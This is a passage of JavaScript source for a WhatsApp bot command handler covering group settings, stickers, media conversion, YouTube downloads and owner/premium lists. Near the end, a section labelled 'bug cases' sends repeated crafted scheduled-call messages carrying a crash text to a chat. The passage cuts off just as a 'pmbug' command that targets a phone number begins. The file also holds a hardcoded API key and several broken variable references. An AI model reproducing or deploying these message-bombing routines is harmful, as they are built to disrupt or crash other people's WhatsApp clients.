                if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Success In Closing The Group 🕊️`)).catch((err) => reply(json(err)))
                } else if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Success In Opening The Group 🕊️`)).catch((err) => reply(json(err)))
                } else {
                    reply(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => reply(json(err)))
                } else if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Successfully Closed Group Edit Info🕊️`)).catch((err) => reply(json(err)))
                } else {
                    reply(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let response = await XeonBotInc.groupInviteCode(m.chat)
                XeonBotInc.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                await XeonBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        reply(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => reply(json(err)))
                break
                case 'p':
            case 'ping':{
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
                await sendMsg(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${latensi.toFixed(4)} Second`,
                            thumbnailUrl: hws,
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the owner😉`
                await sendMsg(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: hws,
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'runtime':
                let runtimetext = `Bots Have Been Running For ${runtime(process.uptime())}`
                sendMsg(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `FORGET DONATE`,
                            thumbnailUrl: hws,
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'sc':
            case 'script':
            case 'scriptbot':
                sendMsg(m.chat, {
                    text: `*Script:* https://youtu.be/Geo3tWsceVI`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on YouTube @DGXeon`,
                            thumbnailUrl: hws,
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'donate':
            case 'donasi':
                let textnate = `Hello Brother ${pushname}\n\nNo matter how much you donate is very valuable for us`
                sendMsg(m.chat, {
                    image: fs.readFileSync('./XeonMedia/donate.jpg'),
                    caption: textnate
                }, {
                    quoted: m
                })
                break
case 'owner': {
const repf = await sendMsg(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
sendMsg(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return reply(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return reply(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return reply(respond)
                if (!text) return reply(respond)
                reply(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await XeonBotInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return reply(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
sendMsg(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
reply(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                reply(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    sendMsg(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                reply(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await sendMsg(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                reply(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                sendMsg(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                reply(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                sendMsg(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `dgxeon.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                reply(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                sendMsg(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                reply(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await sendMsg(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                reply(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    reply(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return reply(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return reply(`Example : ${prefix + command} 😅+🤔`)
                reply(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return reply(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    sendMsg(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    sendMsg(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return reply(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await sendMsg(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return reply(`Example:\n${prefix}fliptext Xeony`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteXeon.length}*`
                reply(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerXeon.length}*`
                reply(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of ImageXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageXeon.length}*`
                reply(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoXeon.length}*`
                reply(teks)
            }
            break
            case 'addowner':
                if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await XeonBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 6287715768324`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
            case 'addvideo': {
                if (!isPremium) return reply(mess.prem)
                if (args.length < 1) return reply('Video Name?')
                if (VideoXeon.includes(q)) return reply("The name you entered already exists")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                VideoXeon.push(q)
                await fsx.copy(delb, `./XeonMedia/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(delb)
                reply(`Success Adding Video\To View Type ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return reply(mess.prem)
                if (args.length < 1) return reply('Enter the Video Name')
                if (!VideoXeon.includes(q)) return reply("Name Does Not Exist in Database")
                let wanu = VideoXeon.indexOf(q)
                VideoXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./XeonMedia/video/${q}.mp4`)
                reply(`Successfully Deleted Video ${q}`)
            }
            break
            case 'addimage': {
                if (!isPremium) return reply(mess.prem)
                if (args.length < 1) return reply('The name of the image?')
                if (ImageXeon.includes(q)) return reply("The name you entered is already registered in the database")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                ImageXeon.push(q)
                await fsx.copy(delb, `./XeonMedia/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(delb)
                reply(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return reply(mess.prem)
                if (args.length < 1) return reply('Enter the Image Name')
                if (!ImageXeon.includes(q)) return reply("The image name you entered is not registered")
                let wanu = ImageXeon.indexOf(q)
                ImageXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(`./XeonMedia/image/${q}.jpg`)
                reply(`Successfully Deleted Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return reply(mess.prem)
                if (args.length < 1) return reply('Enter the name of the sticker?')
                if (StickerXeon.includes(q)) return reply("Name Already In Use")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./XeonMedia/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(delb)
                reply(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return reply(mess.prem)
                if (args.length < 1) return reply('Enter the name of the sticker')
                if (!StickerXeon.includes(q)) return reply("Name Not Registered in Database")
                let wanu = StickerXeon.indexOf(q)
                StickerXeonBotInc.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./XeonMedia/sticker/${q}.webp`)
                reply(`Successfully Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return reply(mess.prem)
                if (args.length < 1) return reply('Enter the Name?')
                if (VoiceNoteXeon.includes(q)) return reply("Name Already In Use")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                VoiceNoteXeon.push(q)
                await fsx.copy(delb, `./XeonMedia/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(delb)
                reply(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return reply(mess.prem)
                if (args.length < 1) return reply('Enter the Name')
                if (!VoiceNoteXeon.includes(q)) return reply("Name Not Registered in Database")
                let wanu = VoiceNoteXeon.indexOf(q)
                VoiceNoteXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./XeonMedia/audio/${q}.mp3`)
                reply(`Successfully Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return reply(mess.prem)
await loading()
if (args.length < 1) return reply(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return reply("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./XeonMedia/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
reply(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return reply(mess.prem)
await loading()
if (args.length < 1) return reply('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return reply("This name does not exist in the database")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./XeonMedia/zip/${teks}.zip`)
reply(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
reply(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return reply(mess.prem)
await loading()
if (args.length < 1) return reply('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return reply("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./XeonMedia/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
reply(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return reply(mess.prem)
await loading()
if (args.length < 1) return reply('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return reply("This name does not exist in the database")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./XeonMedia/apk/${teks}.apk`)
reply(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
reply(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return reply(mess.prem)
await loading()
if (args.length < 1) return reply('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return reply("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./XeonMedia/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
reply(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return reply(mess.prem)
await loading()
if (args.length < 1) return reply('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return reply("This name does not exist in the database")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./XeonMedia/doc/${teks}.pdf`)
reply(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
reply(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return reply(mess.group)
                if (isAfkOn) return reply("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                reply(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
      case 'qc': {
                const {
                    quote
                } = require('./lib/quote.js')
                if (!q) return reply('Enter Text')
                let ppnyauser = await await XeonBotInc.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
                const rest = await quote(q, pushname, ppnyauser)
                reply(mess.wait)
                XeonBotInc.sendImageAsSticker(m.chat, rest.result, m, {
                    packname: `${global.packname}`,
                    author: `${global.author}`
                })
            }
            break
case 'play':  case 'song': {
if (!text) return reply(`Example : ${prefix + command} anime whatsapp status`)
const xeonplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await sendMsg(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case "ytmp3": case "ytaudio":
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) return reply(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await xeonaudp3.mp3(text)
await sendMsg(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) reply(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await sendMsg(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
XeonBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await sendMsg(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

//bug cases
case 'amountbug': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'pmbug' :{
 if (!isPremium) return reply(mess.prem)
 if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6287715768324`)
